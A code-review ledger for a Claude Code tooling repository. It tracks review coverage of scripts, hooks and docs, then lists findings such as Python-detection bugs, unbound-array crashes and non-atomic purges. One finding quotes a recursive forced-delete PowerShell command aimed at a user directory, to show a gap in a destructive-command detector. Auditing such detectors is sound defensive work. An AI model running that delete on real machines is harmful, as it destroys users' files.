# Spotter full pass — every-line scrub (2026-07-30)
<!-- cruft-check:exempt-historical -->

Phase 105. Frozen working record, exempt-historical from birth. **241 tracked files, 33,064 lines.** Findings go to observations (severity in notes); NOTHING is fixed in-pass. The ledger below is the proof of coverage: a file without a reviewed-at stamp is not reviewed, and the pass is not done until every row is stamped. Mirror-parity rule: byte-identical mirror pairs (md5-verified at review time) share one review and both rows stamp with a parity note.

Severity scale: BLOCKER-for-strangers / SHOULD-FIX / COSMETIC. CLEAN is a legitimate verdict.

## Wave A — shipped scripts (33 files, 9,451 lines)

| file | lines | reviewed at | verdict |
|---|---|---|---|
| .claude/scripts/commit.sh | 57 | 0d28839 | 1 COSMETIC |
| .claude/scripts/cruft-check.sh | 657 | 0d28839 | 2 SHOULD-FIX |
| .claude/scripts/deploy.sh | 51 | 0d28839 | 1 SHOULD-FIX / 2 COSMETIC |
| .claude/scripts/drift-check.sh | 74 | 0d28839 | CLEAN |
| .claude/scripts/goals-surface.sh | 120 | 0d28839 | CLEAN |
| .claude/scripts/graduation-review.sh | 110 | 0d28839 | CLEAN |
| .claude/scripts/plugin-context-matcher.sh | 461 | 0d28839 | 2 SHOULD-FIX / 1 COSMETIC |
| .claude/scripts/plugin-discovery.sh | 370 | 0d28839 | CLEAN |
| .claude/scripts/plugin-quality-check.sh | 489 | 0d28839 | 2 SHOULD-FIX / 2 COSMETIC |
| .claude/scripts/receipt-render.sh | 722 | 0d28839 | 3 COSMETIC |
| .claude/scripts/share-disable.sh | 128 | 0d28839 | 2 SHOULD-FIX / 2 COSMETIC |
| .claude/scripts/share-enable.sh | 159 | 0d28839 | 2 SHOULD-FIX / 2 COSMETIC |
| .claude/scripts/share-status.sh | 64 | 0d28839 | 1 SHOULD-FIX / 1 COSMETIC |
| .claude/scripts/shared-memory-produce.sh | 112 | 0d28839 | CLEAN |
| .claude/scripts/shared-memory-push.sh | 138 | 0d28839 | 2 COSMETIC |
| .claude/scripts/task-watchdog.sh | 524 | 0d28839 | 2 SHOULD-FIX / 1 COSMETIC |
| scripts/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| scripts/install.sh | 562 | 0d28839 | 5 SHOULD-FIX / 3 COSMETIC |
| scripts/update.sh | 1184 | 0d28839 | 2 BLOCKER / 5 SHOULD-FIX / 6 COSMETIC |
| template/.claude/scripts/commit.sh | 57 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/scripts/deploy.sh | 51 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/scripts/drift-check.sh | 74 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/scripts/goals-surface.sh | 120 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/scripts/plugin-context-matcher.sh | 461 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/scripts/plugin-discovery.sh | 370 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/scripts/plugin-quality-check.sh | 489 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/scripts/receipt-render.sh | 722 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/scripts/share-disable.sh | 128 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/scripts/share-enable.sh | 159 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/scripts/share-status.sh | 64 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/scripts/shared-memory-produce.sh | 112 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/scripts/shared-memory-push.sh | 138 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/scripts/task-watchdog.sh | 524 | 0d28839 | mirror-parity (byte-identical to the reviewed twin) |

## Wave B — hooks + libs (36 files, 4,770 lines)

| file | lines | reviewed at | verdict |
|---|---|---|---|
| .claude/hooks/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| .claude/hooks/README.md | 49 | 8f5ae35 | 1 COSMETIC |
| .claude/hooks/precompact-backup.sh | 33 | 8f5ae35 | 2 SHOULD-FIX |
| .claude/hooks/pretooluse-bash-safety.sh | 157 | 8f5ae35 | 2 BLOCKER / 3 SHOULD-FIX |
| .claude/hooks/pretooluse-powershell-safety.sh | 167 | 8f5ae35 | 2 BLOCKER / 1 SHOULD-FIX |
| .claude/hooks/sessionend-cost-proposals.sh | 228 | 8f5ae35 | 1 SHOULD-FIX / 1 COSMETIC |
| .claude/hooks/sessionend-observe.sh | 55 | 8f5ae35 | 1 SHOULD-FIX / 1 COSMETIC |
| .claude/hooks/sessionstart-cost-summary.sh | 325 | 8f5ae35 | CLEAN |
| .claude/hooks/sessionstart-rules.sh | 155 | 8f5ae35 | 1 SHOULD-FIX / 2 COSMETIC |
| .claude/lib/destructive-bash-patterns.sh | 30 | 8f5ae35 | 1 BLOCKER / 2 SHOULD-FIX |
| .claude/lib/destructive-powershell-patterns.sh | 33 | 8f5ae35 | 1 BLOCKER / 2 SHOULD-FIX |
| .claude/lib/generate-session-telemetry.sh | 526 | 8f5ae35 | 1 SHOULD-FIX / 2 COSMETIC |
| .claude/lib/migrate-observation-privacy.sh | 85 | 8f5ae35 | CLEAN |
| .claude/lib/redact-capture.sh | 122 | 8f5ae35 | 1 SHOULD-FIX / 2 COSMETIC |
| .claude/lib/redact-observation.sh | 125 | 8f5ae35 | 1 COSMETIC |
| .claude/lib/shared-memory-git.sh | 94 | 8f5ae35 | 1 COSMETIC |
| .claude/lib/shared-memory-lib.sh | 146 | 8f5ae35 | 2 SHOULD-FIX |
| .claude/lib/shared-memory.schema.md | 55 | 8f5ae35 | CLEAN |
| template/.claude/hooks/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| template/.claude/hooks/README.md | 49 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/hooks/precompact-backup.sh | 33 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/hooks/pretooluse-bash-safety.sh | 157 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/hooks/pretooluse-powershell-safety.sh | 167 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/hooks/sessionend-cost-proposals.sh | 228 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/hooks/sessionend-observe.sh | 55 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/hooks/sessionstart-cost-summary.sh | 325 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/hooks/sessionstart-rules.sh | 155 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/lib/destructive-bash-patterns.sh | 30 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/lib/destructive-powershell-patterns.sh | 33 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/lib/generate-session-telemetry.sh | 526 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/lib/migrate-observation-privacy.sh | 85 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/lib/redact-capture.sh | 122 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/lib/redact-observation.sh | 125 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/lib/shared-memory-git.sh | 94 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/lib/shared-memory-lib.sh | 146 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/lib/shared-memory.schema.md | 55 | 8f5ae35 | mirror-parity (byte-identical to the reviewed twin) |

## Wave C — config, schemas, fixtures, CI, seeds (21 files, 5,229 lines)

| file | lines | reviewed at | verdict |
|---|---|---|---|
| .claude/agents/05_meta/script-builder.schema.md | 213 | 777dbb3 | CLEAN |
| .claude/agents/05_meta/session-observer.schema.md | 151 | 777dbb3 | 3 SHOULD-FIX / 3 COSMETIC |
| .claude/agents/05_meta/workflow-suggester.schema.md | 150 | 777dbb3 | 1 COSMETIC |
| .claude/gate-config.json | 84 | 777dbb3 | CLEAN |
| .claude/recommendations/recommendation.schema.md | 67 | 777dbb3 | CLEAN |
| .claude/settings.json | 105 | 777dbb3 | CLEAN |
| .claude/specs/goal-spec.schema.md | 43 | 777dbb3 | 1 COSMETIC |
| .gitattributes | 14 | 777dbb3 | CLEAN |
| .github/test-fixtures/scenarios.sh | 3076 | 777dbb3 | 2 SHOULD-FIX / 4 COSMETIC |
| .github/workflows/ci.yml | 295 | 777dbb3 | 2 SHOULD-FIX / 1 COSMETIC |
| .gitignore | 79 | 777dbb3 | CLEAN |
| template/.claude/agents/05_meta/script-builder.schema.md | 213 | 777dbb3 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/agents/05_meta/session-observer.schema.md | 151 | 777dbb3 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/agents/05_meta/workflow-suggester.schema.md | 150 | 777dbb3 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/gate-config.json | 80 | 777dbb3 | CLEAN |
| template/.claude/recommendations/recommendation.schema.md | 67 | 777dbb3 | mirror-parity (byte-identical to the reviewed twin) |
| template/.claude/settings.json.template | 97 | 777dbb3 | 1 SHOULD-FIX |
| template/.claude/specs/goal-spec.schema.md | 43 | 777dbb3 | mirror-parity (byte-identical to the reviewed twin) |
| template/.gitignore.template | 56 | 777dbb3 | CLEAN |
| template/CLAUDE.md.template | 38 | 777dbb3 | 2 SHOULD-FIX |
| template/ROUTING.md.template | 57 | 777dbb3 | CLEAN |

## Wave D — agents, commands, skills, directive contracts (83 files, 5,986 lines)

| file | lines | reviewed at | verdict |
|---|---|---|---|
| .claude/agents/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| .claude/agents/01_research/research-helper.md | 42 | — | — |
| .claude/agents/02_audit/audit-helper.md | 43 | — | — |
| .claude/agents/03_monitoring/monitoring-helper.md | 42 | — | — |
| .claude/agents/04_planning/plan-coordinator.md | 44 | — | — |
| .claude/agents/05_meta/agent-slicer.md | 77 | — | — |
| .claude/agents/05_meta/artifact-fit-analyzer.md | 142 | — | — |
| .claude/agents/05_meta/code-quality-auditor.md | 118 | — | — |
| .claude/agents/05_meta/cruft-checker.md | 130 | — | — |
| .claude/agents/05_meta/drift-checker.md | 77 | — | — |
| .claude/agents/05_meta/integration-installer.md | 115 | — | — |
| .claude/agents/05_meta/manager-optimizer.md | 133 | — | — |
| .claude/agents/05_meta/plugin-context-matcher.md | 78 | — | — |
| .claude/agents/05_meta/plugin-discovery-agent.md | 88 | — | — |
| .claude/agents/05_meta/project-tuner-helper.md | 188 | — | — |
| .claude/agents/05_meta/roadmap-auditor.md | 109 | — | — |
| .claude/agents/05_meta/script-builder.md | 107 | — | — |
| .claude/agents/05_meta/self-audit-helper.md | 94 | — | — |
| .claude/agents/05_meta/system-memory-helper.md | 73 | — | — |
| .claude/agents/05_meta/task-watchdog.md | 77 | — | — |
| .claude/agents/05_meta/token-cost-monitor.md | 92 | — | — |
| .claude/agents/05_meta/workflow-suggester.md | 85 | — | — |
| .claude/commands/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| .claude/commands/audit.md | 14 | — | — |
| .claude/commands/commit.md | 11 | — | — |
| .claude/commands/deploy.md | 15 | — | — |
| .claude/commands/goals.md | 50 | — | — |
| .claude/commands/graduation-review.md | 17 | — | — |
| .claude/commands/share-disable.md | 36 | — | — |
| .claude/commands/share-enable.md | 33 | — | — |
| .claude/commands/share-preview.md | 17 | — | — |
| .claude/commands/share-push.md | 23 | — | — |
| .claude/commands/share-status.md | 13 | — | — |
| .claude/commands/smoke-test.md | 13 | — | — |
| .claude/skills/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| .claude/skills/bash-safety/SKILL.md | 94 | — | — |
| .claude/skills/god-file-grep-first/SKILL.md | 45 | — | — |
| .claude/skills/plugin-roster-search/SKILL.md | 49 | — | — |
| .claude/skills/post-edit-test-suggest/SKILL.md | 41 | — | — |
| .claude/skills/schema-verify-before-edit/SKILL.md | 37 | — | — |
| .claude/skills/token-efficiency-monitor/SKILL.md | 57 | — | — |
| CLAUDE.md | 38 | — | — |
| CLAUDE_MANAGER.md | 557 | — | — |
| ROUTING.md | 58 | — | — |
| template/.claude/agents/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| template/.claude/agents/01_research/research-helper.md | 42 | — | — |
| template/.claude/agents/02_audit/audit-helper.md | 43 | — | — |
| template/.claude/agents/03_monitoring/monitoring-helper.md | 42 | — | — |
| template/.claude/agents/04_planning/plan-coordinator.md | 44 | — | — |
| template/.claude/agents/05_meta/agent-slicer.md | 77 | — | — |
| template/.claude/agents/05_meta/artifact-fit-analyzer.md | 142 | — | — |
| template/.claude/agents/05_meta/code-quality-auditor.md | 118 | — | — |
| template/.claude/agents/05_meta/drift-checker.md | 77 | — | — |
| template/.claude/agents/05_meta/integration-installer.md | 115 | — | — |
| template/.claude/agents/05_meta/manager-optimizer.md | 133 | — | — |
| template/.claude/agents/05_meta/plugin-context-matcher.md | 78 | — | — |
| template/.claude/agents/05_meta/plugin-discovery-agent.md | 88 | — | — |
| template/.claude/agents/05_meta/project-tuner-helper.md | 188 | — | — |
| template/.claude/agents/05_meta/script-builder.md | 107 | — | — |
| template/.claude/agents/05_meta/self-audit-helper.md | 94 | — | — |
| template/.claude/agents/05_meta/system-memory-helper.md | 73 | — | — |
| template/.claude/agents/05_meta/task-watchdog.md | 77 | — | — |
| template/.claude/agents/05_meta/token-cost-monitor.md | 92 | — | — |
| template/.claude/agents/05_meta/workflow-suggester.md | 85 | — | — |
| template/.claude/commands/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| template/.claude/commands/audit.md | 14 | — | — |
| template/.claude/commands/commit.md | 11 | — | — |
| template/.claude/commands/deploy.md | 15 | — | — |
| template/.claude/commands/goals.md | 50 | — | — |
| template/.claude/commands/share-disable.md | 36 | — | — |
| template/.claude/commands/share-enable.md | 33 | — | — |
| template/.claude/commands/share-preview.md | 17 | — | — |
| template/.claude/commands/share-push.md | 23 | — | — |
| template/.claude/commands/share-status.md | 13 | — | — |
| template/.claude/commands/smoke-test.md | 13 | — | — |
| template/.claude/skills/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| template/.claude/skills/bash-safety/SKILL.md | 94 | — | — |
| template/.claude/skills/god-file-grep-first/SKILL.md | 45 | — | — |
| template/.claude/skills/plugin-roster-search/SKILL.md | 49 | — | — |
| template/.claude/skills/post-edit-test-suggest/SKILL.md | 41 | — | — |
| template/.claude/skills/schema-verify-before-edit/SKILL.md | 37 | — | — |
| template/.claude/skills/token-efficiency-monitor/SKILL.md | 57 | — | — |
| template/CLAUDE_MANAGER.md.template | 551 | — | — |

## Wave E — public docs (9 files, 1,488 lines)

| file | lines | reviewed at | verdict |
|---|---|---|---|
| COMMERCIAL.md | 21 | 8f5ae35 | CLEAN |
| LICENSE | 102 | 8f5ae35 | CLEAN |
| README.md | 95 | 8f5ae35 | 1 SHOULD-FIX |
| docs/ARCHITECTURE.md | 185 | 8f5ae35 | 2 COSMETIC |
| docs/CHANGELOG.md | 353 | 8f5ae35 | CLEAN |
| docs/GETTING-STARTED.md | 160 | 8f5ae35 | 2 BLOCKER / 2 SHOULD-FIX |
| docs/PLUGINS-GETTING-STARTED.md | 123 | 8f5ae35 | 1 COSMETIC |
| docs/ROADMAP.md | 329 | 8f5ae35 | 1 BLOCKER / 1 SHOULD-FIX / 1 COSMETIC |
| docs/STORY.md | 120 | 8f5ae35 | 1 BLOCKER |

## Wave F — everything remaining (59 files, 6,140 lines)

| file | lines | reviewed at | verdict |
|---|---|---|---|
| .claude/.skeleton-version | 180 | 8f5ae35 | CLEAN |
| .claude/captures/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| .claude/captures/6f7e14b7176e480c04f38c4383ca09763bdc2b9015ac4eedcaeba3ca6e59cac8.md | 56 | 8f5ae35 | CLEAN |
| .claude/captures/README.md | 42 | 8f5ae35 | 1 SHOULD-FIX |
| .claude/captures/fe22198210607aea481ac447d5620d9450b7f5d6e6d9dcdf3a2fd9dacb1b3f75.md | 43 | 8f5ae35 | CLEAN |
| .claude/observations/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| .claude/observations/README.md | 30 | 8f5ae35 | CLEAN |
| .claude/scripts/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| .claude/scripts/drafts/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| .claude/scripts/drafts/README.md | 55 | 8f5ae35 | CLEAN |
| .claude/specs/README.md | 27 | 8f5ae35 | CLEAN |
| .claude/specs/propagate-skeleton-tv-eog.md | 84 | 8f5ae35 | CLEAN |
| .claude/telemetry/README.md | 34 | 8f5ae35 | 1 SHOULD-FIX |
| .claude/telemetry/events/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| .claude/telemetry/model-pricing.json | 22 | 8f5ae35 | CLEAN |
| .claude/telemetry/optimizer-proposals.json | 152 | 8f5ae35 | CLEAN |
| .claude/telemetry/retier-proposals.json | 19 | 8f5ae35 | CLEAN |
| .claude/telemetry/sessions/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| VERSION | 1 | 8f5ae35 | CLEAN |
| docs/AUDIT-2026-07-27-spotter-state.md | 167 | 8f5ae35 | CLEAN |
| docs/AUDIT-v1.1.4-cc-side.md | 338 | 8f5ae35 | CLEAN |
| docs/AUDIT-v1.1.4-marker-refresh-dryrun.md | 159 | 8f5ae35 | CLEAN |
| docs/AUDIT-v1.1.4-state.md | 962 | 8f5ae35 | CLEAN |
| docs/HOOK_SCHEMA.md | 50 | 8f5ae35 | CLEAN |
| docs/INSTALLATION.md | 380 | 8f5ae35 | 1 COSMETIC |
| docs/PHILOSOPHY.md | 97 | 8f5ae35 | 2 COSMETIC |
| docs/PLUGIN-INSTALLS-v1.1.4.md | 701 | 8f5ae35 | 2 SHOULD-FIX |
| docs/scratch/claude-manager-reframe-audit.md | 82 | 8f5ae35 | CLEAN |
| docs/scratch/claude-md-reframe-audit.md | 91 | 8f5ae35 | CLEAN |
| docs/scratch/phase-36-framework.md | 71 | 8f5ae35 | CLEAN |
| experiments/confidence/.gitignore | 5 | 8f5ae35 | CLEAN |
| experiments/confidence/ANALYSIS.md | 92 | 8f5ae35 | 1 SHOULD-FIX |
| experiments/confidence/MANIFEST_HEADER.md | 28 | 8f5ae35 | CLEAN |
| experiments/confidence/README.md | 13 | 8f5ae35 | CLEAN |
| experiments/confidence/analysis.py | 369 | 8f5ae35 | 1 SHOULD-FIX |
| experiments/confidence/harness.py | 167 | 8f5ae35 | CLEAN |
| experiments/confidence/real_manifest.json | 713 | 8f5ae35 | 1 COSMETIC |
| experiments/confidence/scatter_agreement_all.png | 172 | 8f5ae35 | CLEAN |
| experiments/confidence/scatter_agreement_gap.png | 115 | 8f5ae35 | CLEAN |
| experiments/reviewer-behavior/DESIGN.md | 211 | 8f5ae35 | 1 COSMETIC |
| template/.claude/captures/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| template/.claude/captures/README.md | 42 | 8f5ae35 | 1 SHOULD-FIX |
| template/.claude/observations/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| template/.claude/observations/README.md | 30 | 8f5ae35 | CLEAN |
| template/.claude/scripts/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| template/.claude/scripts/drafts/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| template/.claude/scripts/drafts/README.md | 55 | 8f5ae35 | CLEAN |
| template/.claude/specs/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| template/.claude/specs/README.md | 27 | 8f5ae35 | CLEAN |
| template/.claude/telemetry/README.md | 34 | 8f5ae35 | 1 SHOULD-FIX |
| template/.claude/telemetry/events/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| template/.claude/telemetry/model-pricing.json | 22 | 8f5ae35 | CLEAN |
| template/.claude/telemetry/optimizer-proposals.json | 19 | 8f5ae35 | CLEAN |
| template/.claude/telemetry/retier-proposals.json | 19 | 8f5ae35 | CLEAN |
| template/.claude/telemetry/sessions/.gitkeep | 0 | 0d28839 | CLEAN (empty dir-keeper, 0 bytes — verified) |
| template/PLUGINS.md.template | 27 | 8f5ae35 | 1 SHOULD-FIX |
| template/docs/ARCHITECTURE.md.template | 51 | 8f5ae35 | CLEAN |
| template/docs/SESSION_LOG.md.template | 40 | 8f5ae35 | CLEAN |
| template/docs/STATUS.md.template | 46 | 8f5ae35 | CLEAN |

### Wave A findings

- **BLOCKER-for-strangers** — `scripts/update.sh:182` — detect_json_tool prefers `python` over `python3` and never verifies the interpreter actually runs or is Python >= 3.7
  - evidence: On stock Windows the WindowsApps `python.exe` stub satisfies `command -v python` but exits 9009 (Store nag), so dump_marker dies with the misleading 'failed to parse .skeleton-version'. On systems where `python` is Python 2, dump_marker's f-strings are a SyntaxError; on 3.6, sys.stdout.reconfigure (line 203) is AttributeError. Should try python3 first and probe with e.g. `"$t" -c 'import sys; sys.exit(0 if sys.version_info>=(3,7) else 1)'`.
- **BLOCKER-for-strangers** — `scripts/update.sh:384` — cleanup_backups/rollback expand empty arrays unguarded; fatal under set -u on bash < 4.4 (macOS 3.2, the script's stated target)
  - evidence: Lines 366/369/374/384/388 use "${MODIFIED[@]}" etc. without the :- guard used everywhere else (cf. lines 77, 609, 1108). cleanup_backups is called unconditionally at line 1183; a run where MODIFIED and DELETED_BACKUPS are empty (e.g. only NEW files applied) dies with 'unbound variable' AFTER write_version_marker, then the EXIT trap's rollback deletes the just-applied files while the marker keeps their hashes — corrupted install state. rollback itself has the same landmine (MODIFIED non-empty but ADDED_FILES empty crashes at line 366 mid-restore, leaving overwritten files and stray .bak.$$ litter).
- **SHOULD-FIX** — `.claude/scripts/cruft-check.sh:16` — All paths are cwd-relative with no CLAUDE_PROJECT_DIR anchor — invoked from any other directory it plants a stray .claude/observations/ tree there
  - evidence: COOLDOWN_FILE/OBS_DIR and every heuristic path ('VERSION', 'docs/CHANGELOG.md', template/ globs) resolve against $PWD; `mkdir -p "$OBS_DIR"` (line 49) then succeeds in the wrong cwd and the scan reports a phantom-clean repo. Sibling goals-surface.sh:17 anchors on ${CLAUDE_PROJECT_DIR:-$PWD} for exactly this reason
- **SHOULD-FIX** — `.claude/scripts/cruft-check.sh:48` — Bare `command -v python` probe: no python3 fallback and no execution validation — auditor silently never runs on python3-only machines and Windows-Store-stub machines
  - evidence: On stock macOS/Linux (python3 only) line 48 exits 0 forever; with the WindowsApps stub, `command -v python` passes but the heredoc exits nonzero and line 650-653 bails silent. goals-surface.sh:34-40 documents this exact class ('Phase 57 silent-inert; probe pattern per Phase 63') and fixes it with the PYBIN execution loop — cruft-check never got the fix, so one leg of the advertised session-start audit triad is a permanent no-op for most outside installs
- **SHOULD-FIX** — `.claude/scripts/deploy.sh:38` — No guard that {{DEPLOY_COMMAND}} was actually configured — an unconfigured run fails with a cryptic 'command not found' (127) instead of a clear message
  - evidence: Run `bash .claude/scripts/deploy.sh` on a clean tree in this install (placeholder still literal): both guards pass, then bash executes the literal token `{{DEPLOY_COMMAND}}` → `{{DEPLOY_COMMAND}}: command not found`, exit 127. A one-line `case "{{DEPLOY_COMMAND}}" in '{{'*) echo not-configured; exit 4;; esac`-style check would fail honestly
- **SHOULD-FIX** — `.claude/scripts/plugin-context-matcher.sh:362` — Candidate audit subprocess inherits caller's cwd while quality-check's pattern libs are cwd-relative — from a non-root cwd, heuristic iii runs with zero patterns yet the manifest records 'clean (i/ii/iii pass)'
  - evidence: Matcher anchors everything on ${CLAUDE_PROJECT_DIR:-.} (line 38) so non-root invocation is supported, but subprocess.run(['bash', quality_check, ...]) passes no cwd; plugin-quality-check.sh:35-36 resolves .claude/lib/destructive-*-patterns.sh against $PWD and read_patterns_from_lib silently returns [] when absent — findings list empty → line 377-378 stamps the audit clean
- **SHOULD-FIX** — `.claude/scripts/plugin-context-matcher.sh:421` — Re-running the matcher on an already-verdicted manifest duplicates frontmatter keys and per-block candidate_audit lines
  - evidence: Blocks that stayed `status: candidate` are re-evaluated every run and edits always append a fresh `- candidate_audit:` line (line 425-430); the frontmatter loop (line 437-442) matches `candidates: N` unconditionally and inserts a second `recommended:`/`not_recommended:` pair. Two consecutive manual runs (nothing prevents this; only discovery regenerates the file) → duplicated keys in .claude/recommendations/manifest.md
- **SHOULD-FIX** — `.claude/scripts/plugin-quality-check.sh:210` — Missing/unreadable pattern libs silently disable heuristic iii with no warning — the audit still runs and (in candidate mode) reports as clean
  - evidence: read_patterns_from_lib returns [] when .claude/lib/destructive-*-patterns.sh is absent (line 210-212, and libs are cwd-relative per lines 35-36); BASH_REGEX/PS_REGEX become empty, check_heuristic_iii iterates nothing, no observation or stderr note marks the degradation
- **SHOULD-FIX** — `.claude/scripts/plugin-quality-check.sh:380` — is_unguarded_target treats Windows drive-letter and $env:/%USERPROFILE% paths as 'guarded' — Remove-Item/rm -rf against C:\... or $env:USERPROFILE is never flagged, on a Windows-first install
  - evidence: A plugin .ps1 containing `Remove-Item -Recurse -Force C:\Users\x` yields target 'C:\Users\x': no '/' or '~' or '$HOME' prefix → falls through to `return False` ('assumed guarded'); `$env:USERPROFILE` hits the line-390 `startswith('$')` branch → also assumed guarded. The broad-set at line 383 is POSIX-only while the PS pattern lib exists precisely for Windows shapes
- **SHOULD-FIX** — `.claude/scripts/share-disable.sh:26` — detect_python is presence-only; Windows Store python stub passes `command -v` but fails on execution, so on a no-python Windows box the script dies with misleading messages instead of 'python is required'
  - evidence: task-watchdog.sh:33-45 documents this exact class and validates by execution (`"$_cand" -c 'pass'`); here json_field returns empty on stub failure, so the purge path dies at line 63 with 'marker has no well-formed install_uuid' — a wrong diagnosis
- **SHOULD-FIX** — `.claude/scripts/share-disable.sh:91` — Purge and disable are not atomic: an interrupt or config-write failure between the successful purge push (line 91) and the enabled=false write (line 101-115) leaves share enabled, and the next SessionEnd re-produces events from untouched local sources and silently re-pushes everything the user just typed 'purge' to delete
  - evidence: Ctrl-C after 'Removed this install's files' but before the python config update: share-config still enabled=true -> shared-memory-push.sh pulls the purge commit, shared-memory-produce.sh regenerates all events from .claude/observations|captures, push restores them to the remote
- **SHOULD-FIX** — `.claude/scripts/share-enable.sh:27` — detect_python presence-only probe: with the Windows Store python stub (or python2 as `python`), marker_field yields empty and the script actively misdiagnoses at line 57 — 'marker has no install_uuid — run bash scripts/update.sh to backfill' — sending a stranger down a wrong fix path
  - evidence: Contrast task-watchdog.sh:39-45 which execution-validates (`"$_cand" -c 'pass'`) citing exactly this stub; here `command -v python` alone selects the stub and every $PY call fails quietly inside command substitution
- **SHOULD-FIX** — `.claude/scripts/share-enable.sh:44` — cleanup() rm -rf's TMP_CLONE while the process cwd is inside it on cancel/die paths after `cd "$TMP_CLONE"` (line 74); Windows refuses to delete a process's cwd, leaving the temp clone behind and spraying rm errors on the user-cancel path
  - evidence: Type anything but 'enable' -> die at line 131 fires the EXIT trap with cwd=$TMP_CLONE; MSYS rm cannot remove the in-use directory (`cd /` first in cleanup fixes it); the happy path is safe only because line 138 cd's back to $ROOT
- **SHOULD-FIX** — `.claude/scripts/share-status.sh:18` — Same presence-only detect_python as share-enable/disable: Windows Store stub or python2 as `python` passes the probe and then the single $PY invocation fails (python2 also lacks sys.stdout.reconfigure), so status errors out instead of reporting or saying 'python 3 required'
  - evidence: task-watchdog.sh:33-45 documents the stub passing `command -v` while exiting nonzero; the fix pattern (execution-validated probe, python3-first) already exists in this repo
- **SHOULD-FIX** — `.claude/scripts/task-watchdog.sh:130` — The cwd-match fallback can scan the wrong session: it only counts transcripts with a cwd event in the first 40 lines, so a just-created current transcript (no cwd event yet) is excluded and candidates[1] becomes the session BEFORE the prior one — the actual prior session is skipped and the marker never records it that cycle
  - evidence: Primary path (line 95) assumes the newest file IS the current session and takes the 2nd; the fallback applies the same [1] index to a list that may already exclude the current session — the two branches encode contradictory assumptions about whether the current transcript is a candidate
- **SHOULD-FIX** — `.claude/scripts/task-watchdog.sh:217` — Redaction and signature normalization only match forward-slash paths — `~?/(?:Users|home)/...` and `/\S+` never match `C:\Users\darre\...` — so on Windows (this repo's primary platform) home-directory usernames and full local paths survive verbatim into observation evidence, summaries, and signatures
  - evidence: A failing `bash C:\Users\darre\secret-project\run.sh` lands unredacted in args_redacted/summary; blast radius is local-only (`.claude/observations` is gitignored and the share gate in redact-observation.sh strips evidence to {timestamp, kind}) but the schema's own redaction rule is violated on the platform it runs on
- **SHOULD-FIX** — `scripts/install.sh:60` — detect_json_tool trusts `command -v` without running the interpreter: the Windows-Store `python`/`python3` stub passes detection then fails at gen_uuid/write_marker_json (after all files copied, forcing rollback with a cryptic Store message); a python2 `python` also fails because write_marker_json uses `open(..., newline="\n")` (Python-3-only builtin kwarg).
